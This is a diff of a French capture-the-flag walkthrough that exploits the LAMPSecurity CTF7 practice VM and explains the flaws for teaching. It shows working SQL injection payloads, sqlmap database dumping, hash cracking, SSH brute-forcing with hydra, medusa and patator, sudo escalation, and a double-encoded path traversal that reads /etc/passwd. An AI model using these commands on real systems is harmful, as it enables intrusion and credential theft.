@@ -7,7 +7,7 @@ Lecture recommandée : [Walkthrough sur le challenge LAMPSecurity: CTF5](/CTF-Vu
 
 ## Recherche d'informations
 
-Pour commencer, l'outil netdiscover est utilisé afin de retrouver l'adresse IP de la VM CTF7 : il s'agit de 192.168.56.103. Néanmoins, il aura fallu ruser car la VM n'a pas obtenu d'adresse IP automatiquement, via DHCP : une connexion en tant que root (méga spoilers [dans le PDF fourni par madirish2600](files/lampsec_ctf7.pdf) avec la machine virtuelle !) puis ```ifconfig eth1 up``` et ```dhclient eth1``` et voilà, le tour est joué.
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM CTF7 : il s'agit de 192.168.56.103. Néanmoins, il aura fallu ruser car la VM n'a pas obtenu d'adresse IP automatiquement, via DHCP : une connexion en tant que root (méga spoilers [dans le PDF fourni par madirish2600](files/lampsec_ctf7.pdf) avec la machine virtuelle !) puis ```ifconfig eth1 up``` et ```dhclient eth1``` et voilà, le tour est joué.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -24,7 +24,7 @@ _____________________________________________________________________________
 
 Toute phase d'attaque commence par une analyse du système cible.
 
-Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation.
+Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- 192.168.56.103
@@ -49,13 +49,13 @@ Il est possible de [se connecter à distance avec SSH](https://en.wikipedia.org/
 
 Le serveur Web semble a priori le plus alléchant pour commencer ; le site qu'il va falloir analyser de fond en comble est un site vitrine créé avec Bootstrap, qui fait la promotion de la _Mad Irish Hacking Academy_. Au menu : des formations en cybersécurité, une newsletter et une collection d'e-books gratuits ou payants à récupérer sur la plate-forme.
 
-![Affichage de l'image CTF7_user_view.png](files/CTF7-user-view.png)
+![Affichage de l'image CTF7_user_view.png](images/CTF7-user-view.png)
 
 ## Exploitation d'une injection SQL sur le paramètre id
 
-Après s'être créé un compte sur la plate-forme, et après quelques tests, on s'aperçoit rapidement que l'URL http://192.168.56.103/profile&id=114 renvoie un formulaire correspondant au profil créé ; tandis que http://192.168.56.103/profile&id=114s renvoie l'erreur SQL ```Invalid query: Unknown column '114s' in 'where clause' Whole query: select * from users where user_id = 114s``` ou encore si id équivaut à ```114 OR '1'='1'#``` on obtient le profil d'un certain Brian Hershel. Tout cela signifie très probablement qu'il y a au moins une injection SQL d'exploitable sur la plate-forme.
+Après s'être créé un compte sur la plate-forme, et après quelques tests, on s'aperçoit rapidement que l'URL ```http://192.168.56.103/profile&id=114``` renvoie un formulaire correspondant au profil créé ; tandis que ```http://192.168.56.103/profile&id=114s``` renvoie l'erreur SQL _Invalid query: Unknown column '114s' in 'where clause' Whole query: select * from users where user_id = 114s_ ou encore si ```id``` équivaut à ```114 OR '1'='1'#``` on obtient le profil d'un certain Brian Hershel. Tout cela signifie très probablement qu'il y a au moins une injection SQL d'exploitable sur la plate-forme.
 
-Afin d'éviter de longs tests manuels fastidieux, pour trouver la bonne syntaxe permettant d'exfiltrer les données de la base MySQL, SQLMap vient à la rescousse. Il s'agit [d'un outil open source permettant d'identifier et d'exploiter une injection SQL](https://connect.ed-diamond.com/MISC/MISC-062/Utilisation-avancee-de-sqlmap) sur des applications Web. En lui spécifiant l'URL du site Web ainsi que les paramètres à tester, SQLMap va tester différentes techniques afin d'identifier la présence d'une injection SQL...
+Afin d'éviter de longs tests manuels fastidieux, pour trouver la bonne syntaxe permettant d'exfiltrer les données de la base MySQL, __SQLMap__ vient à la rescousse. Il s'agit [d'un outil open source permettant d'identifier et d'exploiter une injection SQL](https://connect.ed-diamond.com/MISC/MISC-062/Utilisation-avancee-de-sqlmap) sur des applications Web. En lui spécifiant l'URL du site Web ainsi que les paramètres à tester, SQLMap va tester différentes techniques afin d'identifier la présence d'une injection SQL...
 
 ```console
 root@blinils:~# sqlmap -u "http://192.168.56.103/profile&id=114"
@@ -83,7 +83,7 @@ web application technology: PHP 5.3.3, Apache 2.2.15
 back-end DBMS: MySQL >= 5.0
 ```
 
-En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et que le paramètre testé _id_ est vulnérable aux injections SQL. Après plusieurs tentatives, SQLMap récupère les tables (--tables) ainsi que les colonnes (--columns) présentes dans chaque base de données trouvée (--dbs), et tant qu'à faire, autant récupérer tout le contenu de la base de données (--dump-all). Voici en bref les résultats remontés par l'outil.
+En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et que le paramètre testé ```id``` est vulnérable aux injections SQL. Après plusieurs tentatives, SQLMap récupère les tables ```--tables``` ainsi que les colonnes ```--columns``` présentes dans chaque base de données trouvée ```--dbs```, et tant qu'à faire, autant récupérer tout le contenu de la base de données avec ```--dump-all```. Voici en bref les résultats remontés par l'outil.
 
 ```console
 [*] information_schema
@@ -140,7 +140,7 @@ Table: users
 +---------+-------------------------------+-----------------+-----------------------------------+
 ```
 
-En tout, plus d'une vingtaine de points d'injection ont été recensés, la liste se veut exhaustive mais une page ou un paramètre m'aura peut-être échappé. Mais comment se fait-il que les pages de l'autre site (celui accessible sur le port 8080) soient listées ici ? Grâce aux hashs de mots de passe stockés dans la table _users_ bien entendu !
+En tout, plus d'une vingtaine de points d'injection ont été recensés, la liste se veut exhaustive mais une page ou un paramètre m'aura peut-être échappé. Mais comment se fait-il que les pages de l'autre site (celui accessible sur le port 8080) soient listées ici ? Grâce aux hashs de mots de passe stockés dans la table ```users``` bien entendu !
 
 ```console
 Injections SQL
@@ -180,7 +180,7 @@ Injections SQL
 
 ## Cassage des mots de passe MD5 présents en base de données
 
-En effet, SQLMap a même eu la gentillesse de demander si les hashs de mots de passe trouvés dans la base de données devaient être crackés ou non (bien sûr que oui !). Ainsi, [l'attaque par dictionnaire sur les hashs de mot de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) a porté ses fruits : dans la table _users_, neuf mots de passe dont huit distincts ont été trouvés. Celui de Ruby Spinster n'a pas été trouvé dans le lot, mais il apparaît dans la table _log_ et une brève vérification du hash MD5 _Shelly2012_ permet de le confirmer.
+En effet, __SQLMap__ a même eu la gentillesse de demander si les hashs de mots de passe trouvés dans la base de données devaient être crackés ou non (bien sûr que oui !). Ainsi, [l'attaque par dictionnaire sur les hashs de mot de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) a porté ses fruits : dans la table ```users```, neuf mots de passe dont huit distincts ont été trouvés. Celui de Ruby Spinster n'a pas été trouvé dans le lot, mais il apparaît dans la table ```log``` et une brève vérification du hash MD5 de la chaîne de caractères ```Shelly2012``` permet de le confirmer.
 
 ```console
 root@blinils:~# cat CTF7-passusers.txt
@@ -216,7 +216,7 @@ Session completed
 
 Une recherche sur [CrackStation](https://crackstation.net/) puis sur [HashKiller](https://www.hashkiller.co.uk/md5-decrypter.aspx) permet d'obtenir les mots de passe manquants.
 
-![Affichage de l'image CTF7-passwords-cracking.png](files/CTF7-passwords-cracking.png)
+![Affichage de l'image CTF7-passwords-cracking.png](images/CTF7-passwords-cracking.png)
 
 Nous sommes donc en mesure de nous constituer deux dictionnaires, l'un contenant des noms d'utilisateurs et l'autre des mots de passe. L'objectif est de déterminer si les utilisateurs sont précautionneux en matière de sécurité, ou s'ils réutilisent le même mot de passe un peu partout...
 
@@ -257,7 +257,7 @@ test
 
 Pour trouver les mots de passe de Brian, d'Alice, de Ruby, de Charles ou encore de Michael, [plusieurs techniques sont possibles](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) : [les attaques par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consistent à tester, de manière exhaustive, toutes les combinaisons possibles ; [les attaques par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking) qui consistent à tester un sous-ensemble de mots ou de combinaisons placés dans un fichier texte ; ou bien [les attaques par social engineering](https://en.wikipedia.org/wiki/Social_engineering_(security)), qui visent à accéder à des informations confidentielles par la manipulation de personnes.
 
-L'outil-couteau-suisse Hydra est de sortie pour une attaque par dictionnaire, avec les _credentials_ trouvés précédemment !
+L'outil-couteau-suisse [__Hydra__](http://sectools.org/tool/hydra/) est de sortie pour une attaque par dictionnaire, avec les _credentials_ trouvés précédemment !
 
 ```console
 root@blinils:~# hydra -L CTF7-users -P CTF7-passwords 192.168.56.103 \
@@ -270,7 +270,7 @@ root@blinils:~# hydra -L CTF7-users -P CTF7-passwords 192.168.56.103 \
 --snip--
 ```
 
-Et hop, le couple test/test fonctionne sur l'interface d'administration du site, accessible sur le port 8080. Et pour SSH ?
+Et hop, le couple ```test:test``` fonctionne sur l'interface d'administration du site, accessible sur le port 8080. Et pour SSH ?
 
 ```console
 root@blinils:~# hydra -L CTF7-users -P CTF7-passwords -t 4 ssh://192.168.56.103
@@ -282,7 +282,7 @@ root@blinils:~# hydra -L CTF7-users -P CTF7-passwords -t 4 ssh://192.168.56.103
 --snip--
 ```
 
-Bizarre... je ne sais pour quelle raison Hydra fait chou blanc, alors que d'autres outils comme [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html) ou [Patator](https://github.com/lanjelot/patator) trouvent des mots de passe valides.
+Bizarre... je ne sais pour quelle raison Hydra fait chou blanc, alors que d'autres outils comme [__Medusa__](http://foofus.net/goons/jmk/medusa/medusa.html) ou [__Patator__](https://github.com/lanjelot/patator) trouvent des mots de passe valides.
 
 ```console
 root@blinils:~# medusa -h 192.168.56.103 -U CTF7-users -P CTF7-passwords -M ssh -v 4
@@ -305,7 +305,7 @@ root@blinils:~# patator ssh_login host=192.168.56.103 user=FILE0 \
 password=FILE1 0=CTF7-users 1=CTF7-passwords -x ignore:mesg='Authentication failed.'
 
 20:18:31 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/)
-20:18:31 patator    INFO -                                                                              
+20:18:31 patator    INFO -                                                                            
 20:18:31 patator    INFO - code  size   time | candidate                 |   num | mesg
 20:18:31 patator    INFO - --------------------------------------------------------------------
 20:18:32 patator    INFO - 0     19    0.320 | brian:my2cents            |     1 | SSH-2.0-OpenSSH_5.3
@@ -323,7 +323,7 @@ password=FILE1 0=CTF7-users 1=CTF7-passwords -x ignore:mesg='Authentication fail
 
 ## Mauvaise gestion des privilèges d'administration via le fichier /etc/sudoers
 
-L'élévation de privilèges est un jeu d'enfant ; en effet, la plupart des comptes [disposent de privilèges](https://doc.ubuntu-fr.org/sudoers) plutôt... permissifs et sont autorisés à exécuter toutes les commandes via sudo. Il est alors possible de passer root avec la commande ```sudo su``` et le tour est joué. Seuls les comptes de Brian, John, Alice et de Julia sont concernés ; ils appartiennent effectivement au groupe _wheel_.
+L'élévation de privilèges est un jeu d'enfant ; en effet, la plupart des comptes [disposent de privilèges](https://doc.ubuntu-fr.org/sudoers) plutôt... permissifs et sont autorisés à exécuter toutes les commandes via sudo. Il est alors possible de passer root avec la commande ```sudo su``` et le tour est joué. Seuls les comptes de Brian, John, Alice et de Julia sont concernés ; ils appartiennent effectivement au groupe ```wheel```.
 
 ```console
 [brian@localhost ~]$ sudo -l
@@ -359,7 +359,7 @@ wheel:x:10:brian,john,alice,julia
 
 ## Analyse de code : exploitation des injections SQL
 
-Parmi les fichiers vulnérables aux injections SQL, on trouve dans /inc le fichier profile.php, dont voici un extrait. 
+Parmi les fichiers vulnérables aux injections SQL, on trouve dans ```/inc``` le fichier ```profile.php```, dont voici un extrait. 
 
 ```console
 [julia@localhost inc]$ pwd
@@ -373,7 +373,7 @@ if (isset($_GET['id'])) {
 }
 ```
 
-Les failles dites d'injection surviennent lorsqu'il n'y a pas de contrôle, de filtrage ou de validation sur les données entrantes. L'injection SQL trouvée sur le site s'explique : le paramètre _id_ fourni par l'utilisateur dans l'URL (via la méthode GET) est utilisé tel quel, concaténé à la requête SQL sans aucune vérification, alors qu'il doit obligatoirement s'agir d'une valeur numérique supérieure ou égale à zéro.
+Les failles dites d'injection surviennent lorsqu'il n'y a pas de contrôle, de filtrage ou de validation sur les données entrantes. L'injection SQL trouvée sur le site s'explique : le paramètre ```id``` fourni par l'utilisateur dans l'URL (via la méthode GET) est utilisé tel quel, concaténé à la requête SQL sans aucune vérification, alors qu'il doit obligatoirement s'agir d'une valeur numérique supérieure ou égale à zéro.
 
 ## Analyse de code : Local File Inclusion (LFI) sur la page index.php
 
@@ -397,16 +397,16 @@ if ($_GET['action'] != 'read') include_once('inc/footer.php');
 	if (! is_file($path)) die("Could not find " . $_GET['file']);
 ```
 
-Une [inclusion de fichier local](http://www.commentcamarche.net/contents/61-attaques-par-manipulation-d-url) (_remote file inclusion_ en anglais) semble possible via ce fichier PHP et son paramètre _action_. Le but du jeu consiste à lire le contenu de fichiers stockés sur le serveur, autres que ceux initialement prévus dans le schéma de navigation du site. Rien n'empêche d'inclure un autre fichier présent sur le serveur, puisqu'aucun contrôle n'est implémenté sur la valeur du paramètre _file_.
+Une [inclusion de fichier local](http://www.commentcamarche.net/contents/61-attaques-par-manipulation-d-url) (_remote file inclusion_ en anglais) semble possible via ce fichier PHP et son paramètre ```action```. Le but du jeu consiste à lire le contenu de fichiers stockés sur le serveur, autres que ceux initialement prévus dans le schéma de navigation du site. Rien n'empêche d'inclure un autre fichier présent sur le serveur, puisqu'aucun contrôle n'est implémenté sur la valeur du paramètre ```file```.
 
-Exemple avec le fichier /etc/passwd qui contient la liste des utilisateurs du système. Il faut ruser et utiliser un [double encodage](https://www.owasp.org/index.php/Double_Encoding) pour y arriver !
+Exemple avec le fichier ```/etc/passwd``` qui contient la liste des utilisateurs du système. Il faut ruser et utiliser un [double encodage](https://www.owasp.org/index.php/Double_Encoding) pour y arriver !
 
 ```console
-root@blinils:/media/sf_share/ctf7# curl --cookie "PHPSESSID=knk91bfkgkv5q51gt203kn6fe6; user=test" \
+root@blinils:~# curl --cookie "PHPSESSID=knk91bfkgkv5q51gt203kn6fe6; user=test" \
 "http://192.168.56.103/read&file=../../../../../../../etc/passwd"
 Can't find requested include: inc/etc/passwd.php
 
-root@blinils:/media/sf_share/ctf7# curl --cookie "PHPSESSID=knk91bfkgkv5q51gt203kn6fe6; user=test" \
+root@blinils:~# curl --cookie "PHPSESSID=knk91bfkgkv5q51gt203kn6fe6; user=test" \
 "http://192.168.56.103/read&file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
@@ -415,23 +415,7 @@ adm:x:3:4:adm:/var/adm:/sbin/nologin
 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
 sync:x:5:0:sync:/sbin:/bin/sync
 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-games:x:12:100:games:/usr/games:/sbin/nologin
-gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
-ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-nobody:x:99:99:Nobody:/:/sbin/nologin
-vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
-saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
-postfix:x:89:89::/var/spool/postfix:/sbin/nologin
-sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-webdev:x:500:500::/home/webdev:/bin/bash
-apache:x:48:48:Apache:/var/www:/sbin/nologin
-mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
-dbus:x:81:81:System message bus:/:/sbin/nologin
-haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+--snip--
 brian:x:501:501::/home/brian:/bin/bash
 john:x:502:502::/home/john:/bin/bash
 alice:x:503:503::/home/alice:/bin/bash
@@ -449,4 +433,4 @@ smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
 webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
 ```
 
-Et voilà qui conclut ce walkthrough, merci à [madirish2600](https://www.vulnhub.com/author/madirish2600,75/) pour avoir créé ces VM LampSecurity vulnérables !
+Et voilà qui conclut ce _walkthrough_, merci à [madirish2600](https://www.vulnhub.com/author/madirish2600,75/) pour avoir créé ces VM LAMPSecurity vulnérables !
